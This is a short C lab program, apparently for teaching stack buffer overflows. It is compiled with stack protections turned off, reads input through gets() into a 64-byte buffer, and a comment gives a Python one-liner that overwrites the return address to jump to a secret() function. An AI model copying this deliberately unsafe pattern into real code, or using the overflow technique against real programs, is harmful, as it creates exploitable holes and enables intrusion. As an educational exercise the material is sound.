//gcc -fno-stack-protector -z execstack -no-pie -o ret2libc ret2libc.c

/*
-fno-stack-protector: removes stack canaries.
-z execstack: marks stack executable (so you could inject shellcode).
-no-pie: disables address randomization for easier exploitation.
*/

#include <stdio.h>
#include <string.h>

// Find the address of secret() (using objdump -d ./ret2libc | grep secret).
void secret() {
    printf("You have reached the secret function!\n");
}

void vulnerable() {
    char buffer[64];

    printf("Enter some text: ");
    gets(buffer);  // Extremely unsafe (no bounds checking)
    printf("You typed: %s\n", buffer);
}

int main() {
    vulnerable();
    printf("Program finished normally.\n");
    return 0;
}

// python3 -c 'print("A"*72 + "\x12\x34\x56\x78")' | ./ret2libc
// (where \x12\x34\x56\x78 is the little-endian address of secret()).

